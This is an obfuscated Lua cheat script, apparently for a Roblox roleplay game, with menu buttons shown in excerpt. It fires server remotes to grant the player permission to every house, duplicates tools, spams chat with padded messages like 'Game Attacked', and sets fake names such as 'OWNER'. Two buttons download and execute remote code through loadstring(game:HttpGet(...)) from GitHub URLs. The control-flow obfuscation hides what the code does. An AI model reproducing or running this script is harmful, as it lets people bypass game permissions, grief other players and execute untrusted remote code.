blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. "Sander X The Best" );
								break;
							end
					...
					["Callback"] = function()
						...
						while true do
							...
							if (FlatIdent_5062 == 2) then
								chatMessage(":)"   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. "Game Attacked" );
								break;
							end
						end
					end
					...
					["Callback"] = function()
						...
						while true do
							...
							if (FlatIdent_101B7 == 2) then
								chatMessage(":"   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. " "   .. blob   .. "Skibidi Toilet" );
								break;
							end
						end
					end
					...
					["Callback"] = function()
						...
						while true do
							...
							if (FlatIdent_52478 == 2) then
								chatMessage(":"   .. blob   .. ""   .. blob   .. ""   .. blob   .. ""   .. blob   .. ""   .. blob   .. ""   .. blob   .. ""   .. blob   .. "From the Screen 📺"   .. blob   .. ""   .. blob   .. "To the Ring 🥊"   .. blob   .. ""   .. blob   .. "To the Pen 🖊️"   .. blob   .. ""   .. blob   .. "To the King 👑" );
								break;
							end
						end
					end
				...
				Tab:AddDropdown({
					...
					["Callback"] = function(Value)
						...
						local characters;
						while true do
							if (FlatIdent_91775 == 0) then
								ReplicatedStorage = game:GetService("ReplicatedStorage");
								remoteEvent = ReplicatedStorage:FindFirstChild("RE"):FindFirstChild("1Updat1eAvata1r");
								FlatIdent_91775 = 1;
							end
							if (FlatIdent_91775 == 2) then
								if characters[Value] then
							...
							if (1 == FlatIdent_91775) then
								...
								characters = {
									...
									["Brighteyes Bloxy Cola Hat"] = 24114402,
									["Telamons Chicken Suit"] = 24112667
								};
								FlatIdent_91775 = 2;
							end
						end
				...
				Tab:AddButton({
					["Name"] = "Korblox Skin",
					["Callback"] = function()
						local FlatIdent_451F3 = 0;
						local FlatIdent_633F6;
						local args;
						while true do
							if (FlatIdent_451F3 == 1) then
								while true do
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						local FlatIdent_45A8F = 0;
						local args;
						while true do
							if (FlatIdent_45A8F == 0) then
								args = {
									[1] = "wear",
									[2] = 31101391
								};
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						local FlatIdent_2C0AE;
						local args;
						while true do
							if (FlatIdent_3579C == 1) then
								while true do
									if (FlatIdent_2C0AE == 0) then
										args = {
											[1] = "wear",
											[2] = 2830437685
										};
				...
				Tab:AddButton({
					["Name"] = "Get Permission To All Houses",
					["Callback"] = function()
						local FlatIdent_4C119 = 0;
						local player;
						local replicatedStorage;
						local permissionEvent;
						local rolePlayEvent;
						while true do
							if (FlatIdent_4C119 == 1) then
								permissionEvent = replicatedStorage.RE:FindFirstChild("1Playe1rTrigge1rEven1t");
								rolePlayEvent = replicatedStorage.RE:FindFirstChild("1RPNam1eTex1t");
								FlatIdent_4C119 = 2;
							end
							...
							if (FlatIdent_4C119 == 2) then
								if (permissionEvent and rolePlayEvent) then
									local FlatIdent_3FB17 = 0;
									local FlatIdent_4B07B;
									local args;
									local bioArgs;
									while true do
										...
										if (FlatIdent_3FB17 == 1) then
											...
											while true do
												if (FlatIdent_4B07B == 0) then
													...
													while true do
														if (FlatIdent_64501 == 0) then
															...
															rolePlayEvent:FireServer(unpack(args));
															FlatIdent_64501 = 1;
														end
												...
												if (FlatIdent_4B07B == 1) then
													...
													while true do
														if (FlatIdent_8A06A == 0) then
															...
															rolePlayEvent:FireServer(unpack(bioArgs));
															FlatIdent_8A06A = 1;
														end
												...
												if (FlatIdent_4B07B == 2) then
													task.spawn(function()
														local FlatIdent_263AB = 0;
														local FlatIdent_4B539;
														local doneArgs;
														local clearArgs;
														local clearBioArgs;
														while true do
															if (FlatIdent_263AB == 2) then
																while true do
																	if (FlatIdent_4B539 == 3) then
																		...
																		rolePlayEvent:FireServer(unpack(clearBioArgs));
																		break;
																	end
																	if (FlatIdent_4B539 == 0) then
																		for houseNumber = 1, 37 do
																			local permissionArgs = {
																				[1] = "GivePermissionLoopToServer",
																				[2] = player,
																				[3] = houseNumber
																			};
																			permissionEvent:FireServer(unpack(permissionArgs));
																			task.wait(1);
																		end
																		doneArgs = {
																			[1] = "RolePlayName",
																	...
																	if (FlatIdent_4B539 == 2) then
																		...
																		rolePlayEvent:FireServer(unpack(clearArgs));
																		FlatIdent_4B539 = 3;
																	end
																	if (FlatIdent_4B539 == 1) then
																		rolePlayEvent:FireServer(unpack(doneArgs));
																		task.wait(5);
																		FlatIdent_4B539 = 2;
																	end
																end
									...
									while true do
										if (FlatIdent_109CF == 0) then
											if  not permissionEvent then
												warn("Event '1Playe1rTrigge1rEven1t' not found!");
											end
											if  not rolePlayEvent then
												warn("Event '1RPNam1eTex1t' not found!");
											end
											break;
										end
									end
				...
				Tab:AddButton({
					["Name"] = "Open Sander X Duplicate Gui",
					["Callback"] = function()
						loadstring(game:HttpGet("https://raw.githubusercontent.com/kigredns/icos/refs/heads/main/r4wtrfgerg"))();
					end
				});
				Section = Tab:AddSection({
					["Name"] = "Buildings 2.0"
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						for m = 1, dupeamot do
							...
							game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Character;
							repeat
								local FlatIdent_6BFE0 = 0;
								while true do
									if (FlatIdent_6BFE0 == 0) then
										if game:GetService("Workspace"):FindFirstChild("Camera") then
											game:GetService("Workspace"):FindFirstChild("Camera"):Destroy();
										end
										task.wait();
						...
						for _, tool in pairs(tools) do
							if (slotCount >= 1110) then
								break;
							end
							for _, equippedTool in pairs(character:GetChildren()) do
							...
							pcall(function()
								game:GetService("Players").LocalPlayer.PlayerGui.ToolGui.ToolSettings.Settings.PropsColor.SetColor:FireServer(color);
							end);
				...
				Tab:AddButton({
					["Name"] = "Falling Balloons From The Sky (Only At Spawn)",
					["Callback"] = function()
						args = {
							[1] = "ClearAllTools"
						};
										...
										if (FlatIdent_10CBF == 0) then
											...
											for basc, aijfw in pairs(toollel:GetDescendants()) do
												if (aijfw.Name == "Handle") then
													...
													local FlatIdent_9D34;
													while true do
														if (FlatIdent_78DE1 == 0) then
															FlatIdent_9D34 = 0;
															while true do
																if (FlatIdent_9D34 == 1) then
																	toollel.Parent = game.Players.LocalPlayer.Character;
																	tollllahhhh = toollel;
																	FlatIdent_9D34 = 2;
																end
																if (FlatIdent_9D34 == 0) then
																	local FlatIdent_3CC1 = 0;
																	while true do
																		if (FlatIdent_3CC1 == 0) then
																			aijfw.Name = "H⁥a⁥n⁥d⁥l⁥e";
																			toollel.Parent = game.Players.LocalPlayer.Backpack;
																			FlatIdent_3CC1 = 1;
																		end
																		if (FlatIdent_3CC1 == 1) then
																			FlatIdent_9D34 = 1;
																			break;
																		end
																	end
																end
																if (FlatIdent_9D34 == 2) then
																	task.wait();
																	break;
																end
															end
						...
						if (toollllfoun == true) then
							local FlatIdent_39506 = 0;
							local FlatIdent_1CE81;
							while true do
								if (FlatIdent_39506 == 0) then
									FlatIdent_1CE81 = 0;
									while true do
						...
						for m = 1, dupeamot do
							...
							while true do
								...
								if (FlatIdent_1135 == 1) then
									while true do
										if (FlatIdent_17786 == 1) then
											picktoolremote:InvokeServer(unpack(args));
											game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolselcted).Parent = game.Players.LocalPlayer.Character;
											if (duping == false) then
												local FlatIdent_98376 = 0;
												local FlatIdent_397EE;
												while true do
						...
						wait();
						duping = false;
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new( -25.9987736, 1, -17.7924728, -0.999961913, -8.311215e-8, -0.0087284008, -8.304869e-8, 1, -7.633143e-9, 0.0087284008, -6.90797e-9, -0.999961913);
						wait(1);
						game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true;
						...
						for z = 0, 49, 7 do
							for x = -45, 47, 4 do
								table.insert(gripPositions, Vector3.new(x, -45, z));
							end
						end
						spawn(function()
							for i, tool in ipairs(backpack:GetChildren()) do
								if tool:IsA("Tool") then
									...
									warn("Skipping non-tool object:", tool.Name);
								end
							end
						end);
						wait(1);
										...
										while true do
											if (FlatIdent_8C13B == 0) then
												...
												for _, child in pairs(item:GetDescendants()) do
													if ((child.Name == "Balloon") or (child.Name == "Handle")) then
														if child:IsA("BasePart") then
															local FlatIdent_37CFB = 0;
															local FlatIdent_41EB8;
															while true do
						...
						wait(0);
						local player = game.Players.LocalPlayer;
						local function unequipInventoryItems()
						...
						unequipInventoryItems();
						local player = game.Players.LocalPlayer;
						if player then
							local FlatIdent_68B4A = 0;
							local FlatIdent_24439;
							local backpack;
							while true do
								if (FlatIdent_68B4A == 1) then
									while true do
										if (FlatIdent_24439 == 0) then
											backpack = player:FindFirstChild("Backpack");
											if backpack then
												for _, present in pairs(backpack:GetChildren()) do
													if (present.Name == "Balloon") then
														local FlatIdent_7D968 = 0;
														local FlatIdent_2D5DD;
														local handle;
														while true do
															...
															if (1 == FlatIdent_7D968) then
																while true do
																	if (FlatIdent_2D5DD == 0) then
																		handle = present:FindFirstChild("Handle");
																		if handle then
						...
						spawn(function()
							for i, tool in ipairs(backpack:GetChildren()) do
								if tool:IsA("Tool") then
									local FlatIdent_781AA = 0;
									while true do
										if (FlatIdent_781AA == 0) then
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						oldcf = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
						if (game.Players.LocalPlayer.Character.Humanoid.Sit == true) then
							local FlatIdent_14F07 = 0;
							local FlatIdent_420ED;
							while true do
								if (FlatIdent_14F07 == 0) then
									FlatIdent_420ED = 0;
									while true do
						...
						for m = 1, 2 do
							...
							local FlatIdent_26492;
							while true do
								if (FlatIdent_74CC4 == 0) then
									FlatIdent_26492 = 0;
									while true do
						...
						for findin, toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
							if toollel:IsA("Tool") then
								if (toollel.Name == toolselcted) then
									...
									local FlatIdent_5AB61;
									while true do
										if (0 == FlatIdent_70F0F) then
											FlatIdent_5AB61 = 0;
											while true do
												if (FlatIdent_5AB61 == 0) then
													toollllfoun2 = true;
													for basc, aijfw in pairs(toollel:GetDescendants()) do
														if (aijfw.Name == "Handle") then
															local FlatIdent_2192D = 0;
															local FlatIdent_14BE1;
															while true do
																if (FlatIdent_2192D == 0) then
																	FlatIdent_14BE1 = 0;
																	while true do
						...
						for fiifi, toollll in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
							if toollll:IsA("Tool") then
								if (toollll.Name == toolselcted) then
									local FlatIdent_8C2E1 = 0;
									while true do
										if (FlatIdent_8C2E1 == 0) then
											toollllfoun = true;
											for nana, jjsjsj in pairs(toollll:GetDescendants()) do
												if (jjsjsj.Name == "Handle") then
						...
						if (toollllfoun2 == true) then
							local FlatIdent_3798C = 0;
							while true do
								if (FlatIdent_3798C == 1) then
									toollllfoun2 = false;
									break;
								end
								if (FlatIdent_3798C == 0) then
									local FlatIdent_5ED70 = 0;
									while true do
										if (FlatIdent_5ED70 == 0) then
											if (game.Players.LocalPlayer.Character:FindFirstChild(tollllahhhh) == nil) then
												toollllfoun2 = false;
											end
											repeat
									...
									while true do
										if (FlatIdent_4E54D == 2) then
											...
											repeat
												...
												local FlatIdent_4B8A0;
												while true do
													if (FlatIdent_877A3 == 0) then
														FlatIdent_4B8A0 = 0;
														while true do
															if (FlatIdent_4B8A0 == 0) then
																if game:GetService("Workspace"):FindFirstChild("Camera") then
																	game:GetService("Workspace"):FindFirstChild("Camera"):Destroy();
																end
																task.wait();
											...
											while true do
												if (FlatIdent_3ABA7 == 1) then
													if (duping == false) then
														...
														local FlatIdent_5E338;
														while true do
															if (FlatIdent_3E49C == 0) then
																FlatIdent_5E338 = 0;
																while true do
						...
						duping = false;
						wait(5);
						loadstring(game:HttpGet("https://raw.githubusercontent.com/kigredns/testUIDK/refs/heads/main/CloseDuplicateInfo.lua"))();
						wait(0.5);
						local TablaGrip = {
							CFrame.new(1.5, -4, 2) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(1, -4, 1) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(2, -4, 1) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(1, -4, "-0") * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(2, -4, "-0") * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(0, -4, "-0") * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(3, -4, "-0") * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(0, -4, -1) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(3, -4, -1) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(1, -4, -1) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(2, -4, -1) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(4, -4, -1) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new( -1, -4, -1) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(4, -4, -2) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new( -1, -4, -2) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(3, -4, -2) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(2, -4, -2) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(1, -4, -2) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(0, -4, -2) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new( -2, -4, -2) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(5, -4, -2) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(0, -4, -3) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new( -1, -4, -3) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new( -2, -4, -3) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(1, -4, -3) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(2, -4, -3) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(3, -4, -3) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(4, -4, -3) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(4, -4, -3) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(5, -4, -3) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new("-0", -4, -4) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new( -1, -4, -4) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new( -2, -4, -4) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(1, -4, -4) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(2, -4, -4) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(3, -4, -4) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(4, -4, -4) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(4, -4, -4) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(5, -4, -4) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new( -3, -4, -4) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new( -3, -4, -3) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(6, -4, -4) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(6, -4, -3) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new( -2, -4, -5) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(5, -4, -5) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new( -1, -4, -5) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(4, -4, -5) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new("-0", -4, -5) * CFrame.Angles(math.rad(90), 0, 0) ,
							CFrame.new(3, -4, -5) * CFrame.Angles(math.rad(90), 0, 0)
						};
									...
									if (0 == FlatIdent_3A1C6) then
										...
										while true do
											if (FlatIdent_2A7CF == 0) then
												...
												gripIndex = math.min(i, #TablaGrip);
												FlatIdent_2A7CF = 1;
											end
											if (FlatIdent_2A7CF == 1) then
												FlatIdent_3A1C6 = 1;
												break;
											end
										end
						...
						while true do
							if (FlatIdent_255D7 == 1) then
								if event then
									...
									while true do
										if (0 == FlatIdent_314F2) then
											event:FireServer(unpack(args));
											print("RolePlay name sent: "   .. Value );
											break;
										end
									end
								else
							...
							if (FlatIdent_255D7 == 0) then
								...
								event = game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t");
								FlatIdent_255D7 = 1;
							end
						end
					end
				...
				local isRunning = false;
				function sendGlitchTexts()
					while isRunning do
						for _, text in ipairs(glitchTexts) do
							if  not isRunning then
								break;
							end
							local args = {
				...
				function startSendingTexts()
					if  not isRunning then
						isRunning = true;
						sendGlitchTexts();
					end
				end
				local function stopSendingTexts()
					isRunning = false;
				end
				Tab:AddToggle({
					["Name"] = "Start/Stop SANDER X Text *better Animation*",
					["Default"] = false,
					["Callback"] = function(Value)
						if Value then
							startSendingTexts();
				...
				Tab:AddDropdown({
					...
					["Callback"] = function(Value)
						local FlatIdent_4FF4B = 0;
						local FlatIdent_28BB6;
						local ReplicatedStorage;
						local remoteEvent;
						local names;
						while true do
							if (FlatIdent_4FF4B == 1) then
								remoteEvent = nil;
								names = nil;
								FlatIdent_4FF4B = 2;
							end
							if (FlatIdent_4FF4B == 0) then
								FlatIdent_28BB6 = 0;
								ReplicatedStorage = nil;
								FlatIdent_4FF4B = 1;
							end
							if (2 == FlatIdent_4FF4B) then
								while true do
									if (1 == FlatIdent_28BB6) then
										local FlatIdent_1DF4C = 0;
										while true do
											if (FlatIdent_1DF4C == 1) then
												FlatIdent_28BB6 = 2;
												break;
											end
											if (FlatIdent_1DF4C == 0) then
														...
														if (FlatIdent_1D124 == 0) then
															...
															while true do
																if (FlatIdent_964BF == 0) then
																	warn("Nie znaleziono RemoteEvent: 1RPNam1eTex1t");
																	return;
																end
															end
														end
												...
												names = {
													["HACKER"] = "҉H҉҉A҉҉C҉҉K҉҉E҉҉R҉",
													["SANDER X THE BEST"] = "҉S҉҉A҉҉N҉҉D҉҉E҉҉R҉ ҉X҉ ҉T҉҉H҉҉E҉ ҉B҉҉E҉҉S҉҉T҉",
													["DARK WEB"] = "҉D҉҉A҉҉R҉҉K҉ ҉W҉҉E҉҉B҉",
													["1x1x1x1"] = "҉1҉҉x҉҉1҉҉x҉҉1҉҉x҉҉1҉",
													["OWNER"] = "҉O҉҉W҉҉N҉҉E҉҉R҉"
												};
												FlatIdent_1DF4C = 1;
											end
										end
									...
									if (FlatIdent_28BB6 == 0) then
										ReplicatedStorage = game:GetService("ReplicatedStorage");
										remoteEvent = ReplicatedStorage:FindFirstChild("RE"):FindFirstChild("1RPNam1eTex1t");
										FlatIdent_28BB6 = 1;
									end
								end
								break;
				...
				local function changeColor()
					local FlatIdent_5090 = 0;
					local args;
					while true do
						if (FlatIdent_5090 == 1) then
							index = index + 1 ;
						...
						if (0 == FlatIdent_5090) then
							local FlatIdent_252D3 = 0;
							while true do
								if (1 == FlatIdent_252D3) then
									FlatIdent_5090 = 1;
									break;
								end
							...
							while true do
								if (FlatIdent_688B2 == 0) then
									...
									while isRunning do
										...
										local FlatIdent_6EE29;
										while true do
											if (FlatIdent_7878 == 0) then
												FlatIdent_6EE29 = 0;
												while true do
													if (FlatIdent_6EE29 == 0) then
														changeColor();
														wait(1);
														break;
													end
				...
				local function stopColorChange()
					isRunning = false;
				end
				Tab:AddToggle({
					["Name"] = "Start/Stop RGB Name",
					["Default"] = false,
					["Callback"] = function(Value)
						if Value then
							startColorChange();
				...
				local colors = {
					Color3.new(0, 0, 0),
					Color3.new(0, 0.26267242431640625, 1),
					Color3.new(1, 0, 0),
					Color3.new(0, 1, 0),
					Color3.new(1, 1, 0)
				};
				...
				local ReplicatedStorage = game:GetService("ReplicatedStorage");
				local remoteEvent = ReplicatedStorage:WaitForChild("RE"):FindFirstChild("1Player1sHous1e");
				local colors = {
					Color3.fromRGB(255, 0, 0),
				...
				local function startColorChange()
					if  not isRunning then
						local FlatIdent_1C6AE = 0;
						local FlatIdent_42214;
						while true do
							if (FlatIdent_1C6AE == 0) then
								FlatIdent_42214 = 0;
								while true do
				...
				local isRunning = false;
				local function requestEmitters()
					while isRunning do
						for _, emitter in ipairs(emitters) do
							local FlatIdent_5960E = 0;
							local FlatIdent_48DDA;
							local args;
							while true do
				...
				local function startRequestingEmitters()
					if  not isRunning then
						local FlatIdent_59E4C = 0;
						local FlatIdent_140E1;
						while true do
				...
				local function stopRequestingEmitters()
					isRunning = false;
				end
				Tab:AddToggle({
					["Name"] = "Start/Stop RGB Aura",
					["Default"] = false,
					["Callback"] = function(Value)
						if Value then
							startRequestingEmitters();
						else
							stopRequestingEmitters();
						end
					end
				});
				Section = Tab:AddSection({
				...
				local changeEvent = RE:WaitForChild("1Max1y");
				local colors = {
					Color3.new(1, 0, 0),
					...
					Color3.new(0, 1, 0),
					Color3.new(0, 0, 1),
					Color3.new(0.294, 0, 0.51),
					Color3.new(0.545, 0, 0.545)
				};
				local isRunning = false;
				local function startColorChange()
					local FlatIdent_7EA45 = 0;
					local FlatIdent_34A16;
					while true do
										...
										for _, color in ipairs(colors) do
											...
											while true do
													...
													while true do
														if (FlatIdent_8E500 == 0) then
															...
															success, err = pcall(function()
																changeEvent:FireServer(unpack(args));
															end);
															FlatIdent_8E500 = 1;
														end
												...
												if (1 == FlatIdent_936E7) then
													if  not success then
														print("Error sending color change: "   .. tostring(err) );
													end
													wait(0.5);
													break;
												end
				...
				Tab:AddToggle({
					["Name"] = "Start/Stop Rainbow Hair Change",
					["Default"] = false,
					["Callback"] = function(Value)
						if Value then
							startColorChange();
						...
						while true do
							if (FlatIdent_68133 == 0) then
								...
								if (FlatIdent_64DDD == 0) then
									index = table.find(colors, currentColor);
									newColor = colors[(index % #colors) + 1 ];
									FlatIdent_64DDD = 1;
								end
								break;
							end
				...
				local function colorChangeLoop()
					while isRunning do
							...
							if (FlatIdent_2F3D2 == 0) then
								...
								while true do
									...
									if (FlatIdent_22E42 == 0) then
										args[2] = changeColor(currentColor);
										game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args));
										FlatIdent_22E42 = 1;
									end
								end
				...
				Tab:AddToggle({
					["Name"] = "Start/Stop Skin Tone Change",
					["Default"] = false,
					["Callback"] = function(Value)
						if Value then
							startColorChange();
				...
				local function startWeaponChange()
					local FlatIdent_26C4F = 0;
					while true do
						if (FlatIdent_26C4F == 0) then
							isRunning = true;
							while isRunning do
								local FlatIdent_826F7 = 0;
								local FlatIdent_74B31;
								while true do
									if (FlatIdent_826F7 == 0) then
										FlatIdent_74B31 = 0;
										while true do
				...
				local function stopWeaponChange()
					isRunning = false;
				end
				Tab:AddToggle({
					["Name"] = "Start/Stop RGB Rifle",
					["Default"] = false,
					["Callback"] = function(Value)
						if Value then
							startWeaponChange();
				...
				local function startWeaponChange()
					...
					local FlatIdent_4A232;
					while true do
						if (FlatIdent_7EA3B == 0) then
							FlatIdent_4A232 = 0;
							while true do
								if (FlatIdent_4A232 == 0) then
									isRunning = true;
									while isRunning do
										local FlatIdent_99740 = 0;
										local FlatIdent_10577;
										while true do
											if (FlatIdent_99740 == 0) then
												FlatIdent_10577 = 0;
												while true do
													if (0 == FlatIdent_10577) then
														changeWeapon();
														wait(0.5);
														break;
													end
						...
						if (FlatIdent_1414D == 1) then
							while true do
								if (FlatIdent_17BD == 0) then
									args = {
										[1] = "RequestingGlockBrown",
										[2] = weapons[weaponIndex]
									};
									game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer(unpack(args));
									FlatIdent_17BD = 1;
								end
								if (1 == FlatIdent_17BD) then
									weaponIndex = (weaponIndex % #weapons) + 1 ;
									break;
								end
							end
					...
					while true do
						if (0 == FlatIdent_4E395) then
							...
							while isRunning do
								...
								local FlatIdent_95ADA;
								while true do
									if (FlatIdent_66E8D == 0) then
										FlatIdent_95ADA = 0;
										while true do
											if (FlatIdent_95ADA == 0) then
												changeWeapon();
												wait(0.5);
												break;
											end
				...
				Tab:AddToggle({
					["Name"] = "Start/Stop RGB Glock Brown",
					["Default"] = false,
					["Callback"] = function(Value)
						if Value then
							startWeaponChange();
				...
				local function startWeaponChange()
					...
					local FlatIdent_1BD42;
					while true do
						if (0 == FlatIdent_288CB) then
							FlatIdent_1BD42 = 0;
							while true do
				...
				local ReplicatedStorage = game:GetService("ReplicatedStorage");
				local remoteEvent = ReplicatedStorage.RE:FindFirstChild("1Player1sCa1r");
				local colors = {
					Color3.fromRGB(255, 0, 0),
					Color3.fromRGB(255, 127, 0),
					Color3.fromRGB(255, 255, 0),
				...
				local function changeColor()
					...
					local FlatIdent_4D36D;
					while true do
						if (0 == FlatIdent_6F5A9) then
							FlatIdent_4D36D = 0;
							while true do
								if (1 == FlatIdent_4D36D) then
								...
								if (FlatIdent_4D36D == 0) then
									...
									while true do
										...
										if (0 == FlatIdent_5BBF) then
											remoteEvent:FireServer("PickingCarColor", colors[currentIndex]);
						...
						if (FlatIdent_75FFA == 0) then
							...
							while true do
								if (FlatIdent_30A09 == 0) then
									isRunning = true;
									while isRunning do
										local FlatIdent_18A3F = 0;
										while true do
											if (FlatIdent_18A3F == 0) then
												changeColor();
												wait(1);
												break;
											end
				...
				local isRunning = false;
				local function changeColor()
					local FlatIdent_945CA = 0;
					while true do
						if (FlatIdent_945CA == 1) then
							if (currentIndex > #colors) then
								currentIndex = 1;
							end
							break;
						end
						if (FlatIdent_945CA == 0) then
							remoteEvent:FireServer("NoMotorColor", colors[currentIndex]);
							currentIndex = currentIndex + 1 ;
							FlatIdent_945CA = 1;
						end
					end
				...
				Tab:AddButton({
					...
					["Callback"] = function()
						...
						while true do
							if (FlatIdent_5F20A == 2) then
								local FlatIdent_5E9C = 0;
								while true do
									if (FlatIdent_5E9C == 0) then
										Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=941008832";
										Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=940996062";
										FlatIdent_5E9C = 1;
									end
